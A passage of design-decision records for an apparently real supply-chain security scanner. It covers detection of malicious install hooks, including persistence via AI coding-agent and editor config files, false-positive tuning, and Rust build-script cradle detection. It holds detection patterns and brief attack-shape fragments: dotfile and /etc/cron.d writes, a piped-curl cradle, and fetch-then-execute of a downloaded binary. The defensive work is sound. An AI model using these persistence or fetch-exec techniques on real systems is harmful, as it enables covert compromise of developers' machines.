note for the next FP/TP sweep.

## D-127 — OPU-35: AI-coding-agent / editor auto-run config as a persistence target

Found via the real `test-repo-runon-only` PoC (built for Miasma cleanup-script validation), surfaced during
true-positive generalization work following OPU-34. The Mini Shai-Hulud SAP CAP wave (April 29 2026,
StepSecurity/Socket) used a compromised package's postinstall hook to write two files into the **consuming
project's root**, not its own package tree: `.vscode/tasks.json` (a `runOn: folderOpen` task, firing the
instant the folder is opened) and `.claude/settings.json` (a `SessionStart` hook, firing on every Claude Code
session). Both survive `npm uninstall` — they live in project configuration, not `node_modules`. Neither path
was in `persistenceMarkers`, the mechanism `VC-002g` (high/gate-eligible) already uses for shell profiles,
cron, systemd/launchd, the Windows Startup folder, and git hooks (OPU-19/OPU-27). A hook writing either file
registered as ordinary `CapFilesystem`, not persistence — the same class of miss OPU-32 found for BRIDGEHEAD,
in a newer technique.

Fix, two layers (the first turned out insufficient on its own, caught during the patch's own validation, not
after shipping): **Layer 1** adds `.vscode/tasks.json`, `.claude/settings.json`, `.claude/settings.local.json`
as flat substring entries to `persistenceMarkers`, the same pattern every existing entry there already uses —
a library's install hook has no legitimate reason to write any of them. **Layer 2**: validating Layer 1
against a faithful, IOC-neutered reproduction of the real mechanism using
`fs.writeFileSync(path.join(cwd, '.claude', 'settings.json'), ...)` — the idiomatic Node.js path-construction
style — it didn't fire. The flat marker requires the literal combined string to appear in source;
`path.join()` with the directory and filename as separate arguments never produces that substring, regardless
of what runs at execution time. Splitting path segments across `path.join()` arguments is arguably *more*
common in real Node.js code than a hardcoded combined string, so this needed a second mechanism, not a
disclosed limitation. Added `claudeSettingsJoinRe`/`vscodeTasksJoinRe`, narrow regexes matching the two path
segments as adjacent quoted arguments; a match emits the same canonical marker string the flat match would,
so `IsPersistenceMarker`/`VC-002g` don't need to know which shape fired — following the precedent
`startupFolderRe` already established for the Windows Startup folder. Deliberately narrow (Decision D-04):
catches the two segments as sibling arguments in the same call, not a variable holding the directory built on
an earlier line — a real, disclosed residual gap, not silently swept under the flat-marker fix.

Independent review before merge found one more gap in the shipped patch itself, not just its own tests:
`claudeSettingsJoinRe`'s `(?:\.local)?` group matches both `settings.json` and `settings.local.json` shapes,
but the code path emitted the literal marker `".claude/settings.json"` unconditionally on any match —
confirmed by direct `scanCaps` inspection: a `path.join(cwd, '.claude', 'settings.local.json')` write produced
evidence `[.claude/settings.json]`, silently misnaming which file the source actually referenced. Not a
detection gap (`IsPersistenceMarker` returns true for either literal, so `VC-002g` still gates correctly) but
a forensic-accuracy one: an analyst reading the finding's evidence would be told the wrong file was written.
Fixed by capturing the `.local` group and branching the emitted marker on it. Mutation-proven: a new test
(`TestClaudeSettingsJoinEvidenceNamesTheRealFile`) fails against the pre-fix code (asserts the *local* marker
where the pre-fix code always emits the non-local one) and passes after; separately confirmed both patch
layers are independently load-bearing by reverting each in isolation (removing the three flat markers fails
only the flat-form tests while the join-form tests keep passing; removing the join-regex evaluation fails only
the join-form tests while the flat-form tests keep passing).

Validation: full suite green (34 packages), `-race` clean on `internal/installsurface`, `go vet` silent,
`gofmt` no diffs. Live end-to-end CLI validation (real npm project + lockfile-resolved dependency with an
actual postinstall hook): BRIDGEHEAD unchanged (exit 1, `VC-002f` block). The esbuild FP shape unchanged
(`VC-002a`/`VC-002b` only, no `VC-002g` — the pre-existing medium/gate-eligible `VC-002b` still makes
`-fail-on-eligible` exit 2 on this fixture, identical to pre-OPU-35 baseline, confirmed not a new regression).
A faithful `path.join()`-split reproduction of the real Mini Shai-Hulud mechanism (writing both
`.vscode/tasks.json` and `.claude/settings.json` into the consuming project root via sibling-argument
`path.join()` calls) now fires `VC-002g` high/gate-eligible with both files correctly named in evidence — exit
0 by default (as expected: `VC-002g` is gate-eligible, not block-tier, so it does not affect exit code without
`-fail-on-eligible`), exit 2 under `-fail-on-eligible`. Did not fire at all before Layer 2 was added.

Residual limitations, disclosed rather than closed: **project discovery for a lockfile-less tree** (the exact
shape of `test-repo-runon-only` in isolation — a bare `.vscode/tasks.json` with no accompanying
`package-lock.json`) is invisible to depSNORT before any check runs at all, confirmed with full flags, not
just `-offline` — this is architectural (project discovery, not the install-surface marker taxonomy) and a
materially bigger change; flagged as a separate, larger candidate, not folded into this patch. **Variable-held
directory paths** (`const dir = path.join(cwd, '.claude'); ...` referenced on a later line) evade both the
flat marker and the join-regex — needs light dataflow tracking, out of scope for this patch's regex-only
approach. **No coverage for other editors/agents' equivalent config** (Cursor's `.cursor/hooks.json`, VS
Code's `.vscode/settings.json` as opposed to `tasks.json`) — scoped to the two paths the one real disclosed
campaign actually used; extending to the broader class is a reasonable follow-up once there's a second real
sample to calibrate against.

## D-128 — OPU-36/37: full Miasma persistence target list + project-root AI-agent config scan

Two open items OPU-35 explicitly left out of scope for a single patch.

**OPU-36 — the remaining Miasma targets.** OPU-35 covered the three files from the Mini Shai-Hulud SAP CAP
wave (`.vscode/tasks.json`, `.claude/settings.json`, `.claude/settings.local.json`). The broader Miasma worm
family (June 2026) wrote a wider set — `.cursor/rules/`, `.cursorrules`, `.windsurfrules`,
`.gemini/settings.json`, `.github/copilot-instructions.md`, `mcp.json`, `.aider.conf.yml` — independently
confirmed by JFrog Security Research, StepSecurity, and Ossprey. Fix: extend `persistenceMarkers` with those
targets, plus `cursorRulesJoinRe` for `.cursor/rules`' three-segment `path.join()` form (it's a directory, so
the real payload writes `path.join(cwd, '.cursor', 'rules', 'setup.mdc')` — three segments, not the two
OPU-35's regexes cover). Same regex-candidate-plus-Go-filter precedent as `claudeSettingsJoinRe`/
`vscodeTasksJoinRe`. Mutation-proven independently: removing the eight flat markers fails only the flat-form
tests; removing `cursorRulesJoinRe`'s evaluation fails only the three-segment join-form test — each mechanism
load-bearing on its own.

**OPU-37 — project-root AI-agent config scan.** Two surfaces OPU-35/36's install-hook source scanning cannot
reach: (1) a project's own root may already carry an AI-agent config file from a prior install — the package
that wrote it removed, the file surviving — with nothing checking its content; (2) a directory with only an
AI-agent config file and no supported ecosystem manifest (the real `test-repo-runon-only` PoC's exact shape)
returned "nothing to scan" at exit 0, a silent false-clean. Fix, two independent, conservative mechanisms:
`AnalyzeAIAgentConfig`/`AIAgentConfigFiles` in `analyze.go` reads a raw AI-agent config file and runs it
through the same `scanCaps` machinery install hooks use — a benign `npm run watch` task carries no capability
markers and produces nothing; only content with its own network egress, obfuscation, or persistence writes
scores. Wired into `npm.ExtractInstallSurface` as a second pass over the project root after the per-package
loop. `aiAgentConfigIndicators`/`aiAgentConfigDirIndicators` in `gap.go` extend `recognizedGapManifests`
(the same D-59 principle already applied to unsupported dependency manifests) so a lockfile-less directory
carrying only `.vscode/tasks.json` is now disclosed as incomplete coverage rather than silently skipped.

**Review finding, before merge — a silent, load-bearing bug in the shipped project-root scan.** The
`npm.ExtractInstallSurface` wiring built its candidate read path as
`filepath.Join(root, filepath.FromSlash(rel))`, where `root` is the adapter's own (possibly relative)
`ExtractInstallSurface` argument — not `absRoot` (`reader.Root()`, already computed one line earlier and used
by every other path in the same function for exactly this reason). `securefs.Reader.ReadFile` re-joins any
relative argument onto its own absolute root, so a relative `root` doubles the directory component and every
read silently fails (the "absent or unreadable — normal" branch swallows it with no gap or warning). Live-fire
testing found this doesn't affect an absolute scan path, and doesn't affect the literal `.` shortcut
(`filepath.Join(".", rel)` lexically strips the leading `.`, hiding the bug) — but silently blinds the entire
OPU-37 project-root scan for the ordinary case of naming a directory on the command line
(`depsnort scan someProject`), the ecosystem-standard way most of this codebase's own tests already invoke
`ExtractInstallSurface` (`TestExtractInstallSurfaceBuildsSubgraph` calls it with `"testdata/wormy"`, a relative
path — the exact shape that would have caught this had a project-root fixture existed there before shipping).
Fixed by using `absRoot` for both the candidate path and the synthetic `project-root:` node ID (the latter also
now stable across a relative vs. absolute invocation of the same directory, rather than producing two
different node IDs for the same project). New regression,
`TestExtractInstallSurfaceProjectRootAIAgentConfigRelativePath` (new `testdata/aiagentconfig` fixture,
including a real malicious `.vscode/tasks.json`), calls `Resolve`/`ExtractInstallSurface` with a relative
testdata path exactly like the file's other tests; mutation-proven — reverting to `root` reproduces the exact
failure (zero hook nodes) this review found live. The repo's own `.gitignore` excludes `.vscode/` — the new
fixture's `.vscode/tasks.json` was force-added (`git add -f`), or the fixture itself would have silently
vanished for anyone cloning fresh, breaking the test in CI while passing locally.

A second, smaller gap: the shipped patch had no direct unit test for `gap.go`'s own `aiAgentConfigIndicators`/
`aiAgentConfigDirIndicators` logic (only for the `installsurface`-package half — `IsPersistenceMarker`/
`AnalyzeAIAgentConfig`). Added `TestRecognizedGapManifestsAIAgentConfig`, covering both the flat-indicator and
directory-relative-indicator shapes plus a negative control; mutation-proven by removing the new
`recognizedGapManifests` block and confirming the test fails.

Validation: full suite green (34 packages), `-race` clean on `internal/installsurface`,
`internal/ecosystem/npm`, and `cmd/depsnort`, `go vet` silent, `gofmt` no diffs. Live end-to-end CLI validation
(real npm project + lockfile + postinstall hook, both absolute AND relative scan-path invocations after the
fix): BRIDGEHEAD unchanged (exit 1). The esbuild FP fixture unchanged, including a newly-added real,
benign project-root `.vscode/tasks.json` (vscode-eslint-shaped) producing zero new findings via the project-
root scan path specifically, not just the install-hook path already covered by OPU-35's review. The OPU-35
Mini Shai-Hulud reproduction still fires `VC-002g` (gate-eligible) under both absolute and relative paths. A
lockfile-less directory containing only `.vscode/tasks.json` now discloses
"discovered 0 project(s) ... (+1 with a recognized but unresolved manifest, disclosed as incomplete coverage)"
instead of exiting clean in silence. A fresh project-root reproduction (a committed, already-malicious
`.vscode/tasks.json` with no install hook involved at all) correctly fires `VC-002b` via the relative-path CLI
invocation, confirmed only after the `absRoot` fix — it silently produced zero findings before it.

Residual limitations, disclosed rather than closed: variable-held directory paths across statement boundaries
(unchanged from OPU-35). OPU-37 only wires `AnalyzeAIAgentConfig` into the npm ecosystem; PyPI/Cargo/RubyGems
don't call it yet — the function and `AIAgentConfigFiles` are exported so each is a one-line addition, not
done here. The `gap.go` discovery fix makes a lockfile-less AI-agent-config tree visible as incomplete
coverage but does not analyze its content (no ecosystem adapter drives a scan of it) — a minimal
`aiAgentConfig` adapter is a reasonable follow-on, left out here since the disclosure alone is a meaningful,
self-contained improvement. `mcp.json` and the bare `.gemini/` directory marker are raw substrings (not
word-bounded, following the codebase's existing precedent for punctuation-anchored markers like `.bashrc`/
`.git/hooks/`) scanned only against install-hook source text, never the project tree — a install hook that
merely mentions either string in passing (e.g. writing a legitimate default MCP config) is a theoretical,
not yet observed, false-positive source worth watching in the next FP sweep.

## D-129 — mcp.json FP sweep: no real FP found; a real one found instead, for a pre-existing marker, and left as-is

Follow-up to D-128's disclosed residual: the `mcp.json` marker's raw-substring match (not word-bounded,
scanned only against install-hook source text) was flagged as a theoretical, not-yet-observed FP source.
Swept it against real npm packages before writing this off further.

**mcp.json: no FP found.** Checked the published `package.json` "scripts" of ten real, actively-maintained
MCP-ecosystem packages (`@modelcontextprotocol/server-filesystem`, `chrome-devtools-mcp`,
`@notionhq/notion-mcp-server`, `@playwright/mcp`, `mongodb-mcp-server`, `@sentry/mcp-server`,
`@cloudflare/mcp-server-cloudflare`, `@upstash/context7-mcp`, `add-mcp`, `@smithery/cli`) via the npm registry
API. None reference `mcp.json` in any of the seven scripts `installsurface.Analyze` actually scans
(`InstallHookNames`: preinstall/install/postinstall/preprepare/prepare/postprepare/prepublish) — most define no
lifecycle scripts at all. The one real tool found that legitimately WRITES `mcp.json`-shaped config
(`add-mcp`, via `npx add-mcp`) is invoked directly by end users, ships no lifecycle scripts of its own, and so
is never in a position to be scanned by this marker regardless. No code change; the residual stays disclosed
as theoretical, now on stronger empirical footing.

**A real FP found instead, for a different, pre-existing marker.** `@smithery/cli`'s published `prepare`
script (the MCP marketplace/installer CLI, a genuinely popular package) is:

```
git config core.hooksPath .githooks 2>/dev/null; pnpm run build
```

Confirmed directly against the scanner: `scanCaps` on that exact string returns `evidence: [core.hooksPath]`,
and `IsPersistenceMarker("core.hooksPath")` is true — this trips `VC-002g` (high/gate-eligible) on a project
depending on `@smithery/cli`. `core.hooksPath` predates this work (OPU-19/27); the finding is unrelated to
mcp.json but surfaced during the same sweep.

**Investigated whether to narrow the marker to close this FP — decided not to, deliberately.** The two
narrowing options both cost more than they save:

- *Exclude by target value* (e.g. only flag non-relative or unusual-looking hooks paths): defeated on
  inspection. `core.hooksPath` exists specifically because the redirect TARGET is attacker-controllable —
  that is the entire threat. A malicious install hook aiming to hijack a consumer's git hooks would use
  exactly the same shape (a plain relative path, a conventional-sounding name like `.githooks`, `2>/dev/null`
  suppression) precisely to blend in with the legitimate pattern; there is no textual feature separating "my
  own repo's dev-hooks setup" from "attacker's bundled hooks directory, given a benign-looking name" — unlike
  OPU-34's named-function filter, the two cases are the same string shape with a different (unobservable)
  intent behind the target path, not two structurally different shapes.
- *Exclude by hook type* (drop `prepare` from this marker specifically): this is the one that would open a
  real hole. `prepare` was deliberately included in `InstallHookNames` because it is the hook npm actually
  runs for a git-URL or local-path dependency — exactly the vector attackers use to ship malware while
  dodging npm registry publish-time scanning. Excluding `prepare` to quiet this FP would blind the specific
  attack `prepare`'s inclusion exists to catch, in exchange for reducing noise on a case that is itself
  benign only because of npm install semantics the static scanner cannot observe (D-04): `prepare` does not
  run for a normal registry-tarball consumer install, so Smithery's own line never actually executes against
  a consumer's repo — a runtime fact, not a textual one.

This is the same tradeoff the codebase already made once, in the opposite direction: bare `husky` was
EXCLUDED from `persistenceMarkers` (OPU-19) because its payload is fixed and well-known — high frequency, low
danger. `core.hooksPath` was kept explicit for the opposite reason — its target is arbitrary, so it is low
frequency but high danger when real. Narrowing it to match husky's treatment would erase exactly the
property that makes it worth having.

**Decision: leave `core.hooksPath` as-is; record this as an investigated, confirmed, and accepted false
positive.** No code change. The operational cost is bounded — `VC-002g` is gate-eligible, not block-tier, so
this FP surfaces as a reviewable line item under `-fail-on-eligible`, never a blocked build. Noted here so a
future FP sweep doesn't re-discover and re-litigate the same tradeoff from scratch.

## D-130 — .profile FP: fixed, unlike D-129's core.hooksPath, because the two cases are structurally different

Broader follow-up to D-129: reviewed every `persistenceMarkers` entry for the same class of risk (a
punctuation-anchored, non-word-bounded raw substring generic enough to collide with ordinary code). Most
entries are either word-bounded already or specific enough as literal strings to stay low-risk. `.profile`
stood out: unlike `.bashrc`/`.git/hooks/`/`mcp.json` (each a specific, multi-token name), "profile" alone is
a common object-property/identifier suffix, so the bare substring matched `user.profileImage`,
`settings.profileData`, `analytics.profileId`, and even a bare `options.profile` accessor — none of them the
shell dotfile. Confirmed locally against the scanner directly (no external search needed here, unlike
mcp.json/core.hooksPath: the pattern is generic enough to construct minimal reproductions without hunting for
a real package). Live-checked several real complex-postinstall packages (puppeteer's real `install.mjs`,
esbuild's real installer, canvas, sharp) for a live hit — found none — but absence of a found live case
carries less weight here than it did for `mcp.json`: this pattern needs no special-purpose tool to trigger,
just any config object with a "profile" field accessed via dot notation.

**Unlike D-129's `core.hooksPath`, this one has a genuine structural fix, not just an accepted tradeoff.**
The distinguishing feature that made `core.hooksPath` unfixable — the benign and malicious cases being the
*same string shape* with only an unobservable difference in intent — does not hold here. The real technique
(`fs.appendFileSync(path.join(os.homedir(), '.profile'), payload)`, or a shell `>> ~/.profile` append) always
references `.profile` as a **complete, standalone path component**: preceded by a quote, path separator, or
whitespace, and followed by a quote, separator, whitespace, or end of string. The FP shape
(`user.profileImage`, `options.profile`) always has an identifier character *immediately before* the `.`
(the preceding property-holder's name) — a structural difference on the LEFT boundary that the flat
raw-substring match never checked, because `.profile` contains punctuation and so skipped the boundary logic
entirely (`isWordMarker` only applies `containsWord` to markers with zero punctuation — a gap that happened
to be safe for the *rest* of that class, `.bashrc`/`.git/hooks/`/`/etc/`, only because those aren't also
common identifier suffixes).

Fix: added `boundaryCheckedPunctuationMarkers`, a small explicit set of punctuation-anchored markers that
still need the dual-boundary `containsWord` check `isWordMarker` normally reserves for identifier-shaped
ones. `.profile` is the first (and, on this review, only) entry. No new mechanism — this reuses the exact
`containsWord` helper "systemd"/"crontab" already route through, just extending which markers are eligible
for it. Verified directly that `containsWord` alone (no new regex needed) already correctly separates every
constructed FP case from every real-technique case, including the trickiest one (`window.chrome.profile`, a
bare accessor with nothing following it at all — the left-boundary check alone excludes it, since "e" from
"chrome" precedes the "."). Cost against the real technique: zero — every real shape tested (`path.join` with
`os.homedir()`, string concatenation, a shell `execSync` append, a bare quoted filename) is preceded by a
quote, `/`, or whitespace, never by an identifier character.

New test, `TestPersistenceDotProfilePrecision` (`dotprofile_fp_test.go`), following the exact structure of
the pre-existing `TestPersistenceStartupPrecision` FP-regression test: six benign cases that must not raise
persistence, four real-technique shapes that must. Mutation-proven: reverting the loop condition to its
pre-fix form (`isWordMarker(m)` alone, without `boundaryCheckedPunctuationMarkers[m]`) fails all six benign
cases with the exact FP behavior found in review, while the real cases keep passing either way — confirming
the fix is genuinely load-bearing and isolated to exactly the class of case it targets.

Validation: full suite green (34 packages), `-race` clean on `internal/installsurface`, `go vet` silent,
`gofmt` no diffs. Live CLI validation: a synthetic install hook with only `.profile`-shaped property access
(no real dotfile write) now scores clean of `VC-002g` — previously would have fired persistence on
`opts.profile = opts.profile || settings.profileData`. A real `.profile` append combined with a piped-curl
cradle still fires both `VC-002f` (critical/block) and `VC-002g` (high/gate-eligible) correctly, unaffected
by the fix.

## D-131 — /etc/ FP: fixed with a different mechanism than D-130's .profile, same sweep

The other candidate flagged in the same review that produced D-130: `/etc/` was also a flat, punctuation-
anchored `persistenceMarkers` entry matched as a raw substring — but "etc" is also a plausible directory-
segment name, so it fired on any relative path that merely NESTS a directory literally named "etc" with
nothing to do with the real absolute Unix system directory: `require('./etc/templates/config.js')`,
`require('./spec/etc/config.js')`. Confirmed directly against the scanner.

**D-130's fix (routing through `containsWord`) does not fully close this one.** `containsWord`'s "before"
check only asks whether the immediately-preceding byte is a non-identifier character — and both `.` and `/`
pass that test, so `./etc/` would still match even with the dual-boundary check applied. `.profile`'s FP
shape (`user.profileImage`) and `/etc/`'s FP shape (`./etc/templates/`) are structurally different problems
wearing the same "punctuation-anchored raw substring" surface: one is an identifier-continuation collision,
the other is a path-nesting collision. They need different fixes, not the same one applied twice.

**The fix:** `etcAbsolutePathRe`, a new regex requiring the leading `/` of `/etc/` to be the START of a
quoted string, a shell/JS argument, or the whole source — matched as a whitelist of legitimate preceding
characters (quote, backtick, whitespace, and the shell/JS separators `; & | ( = > <` `,`) rather than a
blacklist, so any preceding character the list doesn't anticipate fails closed. `/etc/` was pulled out of the
flat `persistenceMarkers` list entirely (mirroring the existing `startupFolderRe`/"startup-folder" precedent,
not `boundaryCheckedPunctuationMarkers`'s in-place `containsWord` reuse) since this needed a genuinely new
regex, not extended eligibility for an existing mechanism. `IsPersistenceMarker` gained a matching special
case, exactly like the existing "startup-folder" one.

**Deliberately left unfixed, and said so in the code**: this does NOT distinguish a READ of `/etc/`
(`fs.existsSync('/etc/os-release')`, a common, legitimate OS/libc-detection idiom in native-module
installers — the exact idiom that motivated checking this marker in the first place) from a WRITE
establishing persistence. No other persistence marker in this list makes that distinction either — a bare
`fs.existsSync('~/.bashrc')` also trips `VC-002g` today — so singling out `/etc/` for read/write semantics
would be inconsistent with the rest of the list, not more correct. Fixing this would need actual call-site
semantic analysis (tracking whether the matched string sits inside a write vs. a read call), a materially
bigger change than a boundary check; noted as a residual, not attempted here.

New test, `TestPersistenceEtcAbsolutePathPrecision` (`etc_fp_test.go`), following the same structure as
`TestPersistenceDotProfilePrecision`: three benign nested-path cases that must not raise persistence, three
real-technique shapes that must (a bare quoted write, a shell append via redirect, and the OS-detection read
— deliberately still flagged, per the note above). Mutation-proven twice, independently: removing the
`etcAbsolutePathRe` evaluation in `scanCaps` fails all three real cases; separately, removing the
`IsPersistenceMarker` special case (leaving the `scanCaps` evaluation intact) also fails all three — both
halves of the fix are independently load-bearing, not redundant with each other.

Validation: full suite green (34 packages), `-race` clean on `internal/installsurface`, `go vet` silent,
`gofmt` no diffs. Live CLI validation: a synthetic install hook doing only `require('./etc/templates/
config.js')` now scores clean of `VC-002g`. A real `fs.writeFileSync('/etc/cron.d/evil', ...)` combined with
a piped-curl cradle still fires both `VC-002f` and `VC-002g` correctly, unaffected by the fix.

## D-132 — OPU-38: analyze a publishable package's own install hook (not just its consumers')

**Trigger:** scanning `github.com/Medium/phantomjs` (`phantomjs-prebuilt@2.1.16`) as its own repo produced
zero install-hook findings despite `"install": "node install.js"` — a script that downloads a native binary,
SHA-256-verifies it, and extracts it with `extract-zip`. depSNORT's install-surface main loop is keyed on a
node's `npm.path` attribute (set to `.` for the root or `node_modules/name` for a dependency by every
lockfile-based resolver); a root node built from a bare `package.json` with no lockfile carries no `npm.path`
at all, so the main loop's `if relDir == "" { continue }` guard silently skips it. Correct for the common
case (scanning your own application — your own scripts are dev tooling, not supply-chain risk), wrong for
evaluating a package's own risk profile before adding it as a dependency, or before publishing it — exactly
the install hook that runs on every consumer's `npm install`.

**The fix:** a new pass after the main loop, gated on three conditions — the node is a registered graph root
(`g.Roots`), it has no `npm.path` (not already handled by the main loop), and its `package.json` does NOT
carry `"private": true` (application roots' `postinstall`/`prepare` scripts are build steps, not
consumer-facing install hooks, and would FP at a high rate under the same scrutiny). When all three hold, the
root's install scripts and load-time entry module are analyzed exactly the way a lockfile-resolved
dependency's are, attributed to the existing root node.

**Review correction to the handoff's own stated scope.** The write-up claims this "does not affect
lockfile-based scanning," citing that "the root project node gets `npm.path = '.'` from the lockfile-aware
code paths (v1, v2/v3 lockfile formats)." True for `package-lock.json` (`npm.go`), `bun.lock`
(`bunlock.go`), and `yarn.lock`'s own root (`yarn.go`) — confirmed by reading each resolver directly. **Not
true for `pnpm-lock.yaml`**: `pnpmlock.go`'s synthesized root (`"Synthesized project root (pnpm-lock.yaml
records no root name/version)"`) sets `npm.source` and `npm.version_source` but never `npm.path`. Built a
live pnpm-lock.yaml fixture (adapted from the repo's own `pnpmlock_test.go` sample) in both a `private: true`
and a publishable shape: the publishable one now correctly fires `VC-002b` on a network-reaching install
script, previously silent; the private one stays clean. This is a genuine, correctly-functioning bonus —
pnpm-based publishable packages had exactly the same undisclosed gap — but it means the patch's actual
impact surface is one ecosystem-format wider than claimed, and the FP calibration set (four VS Code
extension repos, all `package-lock.json`-based per the handoff) never exercised the pnpm code path at all.
Documented here rather than left for the next person to rediscover.

**Review finding — a real misattribution bug the shipped tests don't catch, mutation-proven.** The new
section reads `absRoot/package.json` unconditionally for every node satisfying the npm.path-empty condition,
gated on `roots[n.ID]` to restrict this to registered graph roots only. `yarn.go`'s own documented design —
*"a yarn tree contributes no npm.path [for its dependency nodes either] and surfaces as source-unavailable"*
— means a yarn.lock-resolved graph can contain **dependency** nodes with an equally empty `npm.path`,
sitting in the same graph as the root. Without the `roots[n.ID]` gate, every one of those dependency nodes
would ALSO have the root's own `package.json`/install.js content read and misattributed to it. The gate is
present and correct in the shipped diff — but no shipped test builds a multi-node graph to prove it, so a
future refactor dropping it silently would go uncaught. Added
`TestOPU38DoesNotMisattributeToNonRootNodes` (a root plus a yarn-shaped dependency node, both npm.path-less);
mutation-proven — removing the `roots[n.ID]` check reproduces the exact misattribution (the dependency node
gains a hook node sourced from the root's `install.js`).

**Review finding — a vacuous test, for a benign reason.** The shipped `TestOPU38LockfileRootNotDuplicated`
claims to verify the OPU-38 section doesn't double-analyze an already-lockfile-resolved root. Mutation-tested
by removing the `npm.path != ""` skip: the test still passed. Root cause, confirmed by reading `graph.go`:
`AddNode` and `AddEdge` are both idempotent by ID (`if existing, ok := g.Nodes[n.ID]; ok { return existing }`;
an edge key already in `edgeSeen` is a no-op), so re-running `Analyze`/`addSurfaceToGraph` on identical
content converges to the same graph state regardless of whether this specific guard exists — the assertion
cannot, by construction, distinguish "ran once" from "ran twice, deduplicated." Unlike the `roots[n.ID]`
guard above, this one is not a correctness bug hiding behind a bad test: the guard is real and worth keeping
purely as a performance optimization (skips a redundant read + re-parse + re-analysis on every scan of an
already-resolved root), but the test's own claim overstated what it proves. Left the guard in place, added a
code comment on the test explaining the idempotency (so the next person doesn't over-trust a passing
mutation-tested-looking assertion that structurally can't fail for the reason it claims), and pointed to the
new, genuinely discriminating test instead.

Validation: full suite green (34 packages), `-race` clean on `internal/ecosystem/npm`. Live CLI validation
against a faithful reproduction of the real `phantomjs-prebuilt` install chain (download via `request`,
SHA-256 verification, `extract-zip` — built independently from the repo's actual `install.js` structure, not
copied from the handoff's own claims) confirms `VC-002b` fires (network egress) and `VC-002f` does not (the
download-then-extract-a-shipped-binary shape is the same non-cradle pattern esbuild's D-25/D-28 regression
already protects — no shell pipe, no cradle signal) — exit 0 without `-fail-on-eligible`, exit 2 with it,
matching the handoff's own before/after table exactly. A live pnpm fixture (see above) confirms the
previously-undisclosed pnpm impact surface behaves correctly in both directions.

Residual limitations, carried forward from the handoff: only the npm ecosystem is covered (PyPI/RubyGems/
Cargo have the analogous root-hook gap, unaddressed here); `"private": true` is npm's own convention for
"not meant to be published," not a semantic guarantee — a package that sets it for unrelated internal
reasons would be excluded, and a workspace root that omits it (however unusual) is included; a bare
`package.json` with no lockfile still leaves the project's OWN declared dependencies unresolved as a
separate, pre-existing coverage gap this patch does not touch.

## D-133 — OPU-39: Cargo/Rust build.rs supply-chain detection (fetch-exec cradle, TLS bypass, git-content exfil)

**Trigger:** `AnalyzeRust` runs `build.rs` content through the shared `scanCaps` engine — the same one every
other ecosystem's install hooks use — and unconditionally tags `CapExec` (a build script always runs by
definition). That was the full extent of Rust-specific coverage. Two real 2026 campaigns exposed exactly
what's missing: **arrayref/proc-macro1** (RUSTSEC-2026-0260/0265, August 2026) — a compromised maintainer
account shipped a `build.rs` that disabled TLS verification, downloaded a remote binary via `reqwest`, and
executed it (~245M combined downloads, transitive dependency of most Rust GUI frameworks); **onering**
(RUSTSEC-2026-0175, June 2026) — a `build.rs` that ran `git log`/`git diff` to harvest the developer's most
recent commit and exfiltrated it to a Sentry ingest endpoint. Neither pattern was reachable by any existing
marker: `asyncCradleRe`/`cradleRe` are JS/shell/PowerShell syntax only; nothing recognized a Rust HTTP fetch,
a TLS-bypass builder call, or git-content-reading as suspicious signals.

**The fix — three additions to `internal/installsurface/analyze.go`, feeding the same shared `scanCaps` every
`AnalyzeRust` call already routes through:**

- `cargoFetchExecCandidateRe` — a `reqwest`/`ureq`/generic-builder fetch (`.get(...).send()`) followed within
  1000 chars by `Command::new`/`process::Command`, filtered the same way OPU-34 learned to filter JS async
  cradles: reject a candidate whose span crosses a separately-declared Rust function (`rustFnDeclRe`, the
  `fn name` analog of OPU-34's `function name`). A second, independent guard requires the `Command::new`
  argument to be an **identifier, not a string literal** (`&dest`, `payload_path` vs. `"sh"`, `"cc"`) — the
  real campaigns always execute a *downloaded path* (necessarily a variable), never a hardcoded tool name.
  This is the one guard that keeps `cmd/depsnort/yanklure_test.go`'s pre-existing `TestHostileBuildRS`
  "ambiguous: network+exec only" case (`reqwest::get(url); Command::new("sh");` — a build that fetches a
  prebuilt binary and separately invokes a generic command, deliberately non-hostile) from regressing.
- `tlsBypassRe` — `danger_accept_invalid_certs(true)`/`danger_accept_invalid_hostnames(true)` (shared by
  reqwest and native-tls) and `SslVerifyMode::NONE` (openssl crate). Feeds `CapObfuscation`: disabling a
  security control to enable a later step is the same conceptual bucket as decoding a hidden payload, and
  co-occurring with the `CapExec` every build.rs already carries correctly raises `VC-002e`.
- `gitContentReadRe` — `Command::new("git")` with `log`/`diff`/`show`/`cat-file` args, gated on `CapNetwork`
  already present in the same scan. Deliberately excludes `rev-parse`/`describe`/`branch`/`status`: those
  reveal only commit *identity* (the ubiquitous, benign version-stamping idiom — e.g. `vergen`, or Microsoft's
  own published `git rev-parse --short HEAD` pattern); `log`/`diff`/`show`/`cat-file` reveal commit *content*
  and have no comparable legitimate build-time use.

**Independent verification, mutation-proven.** Reproduced every claim rather than trusting the handoff:
confirmed by reading `cmd/depsnort/yanklure_test.go` and `testdata/adversarial/cargo-buildrs-exfil/build.rs`
directly, then empirically (not just by manual regex-tracing) confirmed `TestHostileBuildRS` still passes
post-patch. Mutation-proved all four load-bearing mechanisms: removing `rustFnDeclRe`'s filter, the
identifier-vs-literal constraint, `tlsBypassRe` itself, `gitContentReadRe`'s `CapNetwork` gate, and its
subcommand exclusion list each independently reproduces a concrete false positive or false negative
(including re-reproducing the exact `TestHostileBuildRS` regression when the identifier-vs-literal constraint
is removed). Adversarially probed two FP-risk areas the handoff's own validation didn't specifically call
out — the generic `.get(...).send()` alternation over-matching unrelated map/channel code, and
`gitContentReadRe`'s handling of chained single-`.arg()` calls where the subcommand isn't in the first
call — both came back clean (no FP; the second is in fact correctly detected already, not a gap).

**Review finding — a vacuous test, for a benign reason (the same OPU-38 pattern).** The shipped
`TestCargoFetchExecCradleDetected` negative case for the function-declaration filter uses
`Command::new("protoc")` (a string literal) as the unrelated function's exec target — already excluded by the
identifier-vs-literal guard regardless of whether `rustFnDeclRe`'s filter exists at all, so mutation-testing
by removing that filter alone left the shipped test passing. Confirmed `rustFnDeclRe` is genuinely
load-bearing via an isolated probe (same shape, but the unrelated function's exec target is an identifier —
`Command::new(tool_path)`): with the filter, no `CapCradle`; with it removed, `CapCradle` fires incorrectly.
Added this case to the shipped test so the function-decl filter has a test that can actually fail for the
reason it claims to guard against.

**Validation:** full suite green (34 packages), `-race` clean on `internal/installsurface` and
`cmd/depsnort`. Live CLI validation against independently-built (not copied from the handoff), IOC-neutered
reproductions of both campaigns: arrayref/proc-macro1 shape (TLS bypass + `client.get(url).send()` fetch +
`fs::write` + `Command::new(&dest)`) → `VC-002f` critical/block + `VC-002e` high/gate-eligible; onering shape
